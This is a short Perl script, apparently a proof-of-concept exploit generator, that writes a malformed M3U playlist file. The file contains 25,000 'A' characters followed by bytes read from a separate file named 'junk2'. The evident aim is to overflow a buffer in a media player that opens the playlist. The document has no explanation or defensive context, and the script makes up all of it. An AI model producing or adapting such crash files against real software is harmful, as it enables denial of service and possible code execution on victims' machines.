#!/usr/bin/env perl

my $buf = "";
my $file= "crash25000.m3u";
my $junk = "\x41" x 25000;

open($FILE, "junk2");
read($FILE, $buf, 5000);
close($FILE);

open($FILE,">$file");
print $FILE $junk.$buf;
close($FILE);
print "m3u File Created successfully\n";
